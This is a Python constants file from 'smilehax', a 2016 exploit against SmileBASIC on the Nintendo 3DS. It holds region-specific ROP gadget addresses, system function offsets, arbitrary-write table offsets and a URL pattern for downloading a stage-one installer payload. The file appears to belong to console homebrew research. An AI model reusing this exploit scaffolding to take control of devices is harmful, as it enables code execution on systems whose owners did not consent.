# smilehax - smilebasic 3ds exploit
# plutoo 2016

import sys

def REGION_CONST(jap300, usa321, usa331):
    if '-DJAP300' in sys.argv:
        return jap300
    if '-DUSA321' in sys.argv:
        return usa321
    if '-DUSA331' in sys.argv:
        return usa331
    raise Exception('wat')

def get_define(name):
    for a in sys.argv:
        if a.startswith('-D%s=' % name):
            a = a[a.find('"')+1:]
            a = a[:a.find('"')]
            return a
    raise Exception('Expected %s as a define.' % name)

TODO = 0

CODE_DST_VA = REGION_CONST(0x00279900, TODO, 0x002a2400);
if '-DNEW3DS' in sys.argv:
    CODE_DST_PA = REGION_CONST(0x27aa9900, TODO, 0x27ab2400);
else:
    CODE_DST_PA = REGION_CONST(0x23ea9900, TODO, 0x23eb2400);

INSTALLER_STAGE1_URL = '%s/%s/installer.bin\0' % \
    (get_define('HTTP_BASE'), get_define('HAX_COMBO'))
INSTALLER_STAGE1_SIZE = 0x800
INSTALLER_STAGE1_BASE = 0x30010000
PERSISTENT_STAGE1_SIZE = 0x800

ROP_START  = REGION_CONST(0x0ffffce0-4, TODO, 0x0ffffcc8-4)
ROP_SAFE   = 0x30000000
# This is the addr and size of the table that the arbitrary-write is based off.
TABLE_OBJ_SIZE       = REGION_CONST(0x000209a0, TODO, 0x000209c0)
TABLE_BASE_OFFSET    = REGION_CONST(0x84, TODO, 0x90)
# Various valid addresses.
CODE_BUF             = 0x30020000
SCRAP_AREA           = 0x00400000 # Assumed zero'd.
# HTTP stuff.
HTTPC_STRUCT_PTR     = SCRAP_AREA
HTTPC_INITSTRUCT     = REGION_CONST(0x001b81dc, TODO, 0x001cc384)
HTTPC_BEGINREQUEST   = REGION_CONST(0x001b8194, TODO, 0x00255dd4)
HTTPC_RECVDATA       = REGION_CONST(0x001b7c0c, TODO, 0x001cd034)
# FS functions.
FS_OPEN_FILE         = REGION_CONST(0x001dd544, TODO, 0x001ec1f4)
FS_READ_FILE         = REGION_CONST(0x0010f1ac, TODO, 0x001e28f8)
# GSP stuff.
GSP_FLUSH_DATA_CACHE = REGION_CONST(0x00125fa8, TODO, 0x00126a70)
GSP_ENQUEUE_CMD_GADGET = REGION_CONST(0x00125e24, TODO, 0x001268ec)
# Other functions.
SVC_SLEEP_THREAD     = REGION_CONST(0x001d0850, TODO, 0x001e5628)
# Gadgets.
GADGET_NOP           = REGION_CONST(0x0010193d, TODO, 0x00104450);
GADGET_MOV_SP_R0__MOV_R0_R2__BX_R1 = REGION_CONST(0x00134548, TODO, 0x001340f0)
GADGET_R0            = REGION_CONST(0x00134544, TODO, 0x001340ec)
GADGET_R1            = REGION_CONST(0x001deb70, TODO, 0x001f5054)
GADGET_R1R2R3R4R5    = REGION_CONST(0x00103b57, TODO, 0x001039bf)
GADGET_POP_R4R5LR__BX_LR = REGION_CONST(0x00104730, TODO, 0x001045d4)

# Virtual memory macros.
PA_TO_GPU_ADDR = lambda pa: pa + 0x10000000
GPU_TO_PA_ADDR = lambda pa: pa - 0x10000000
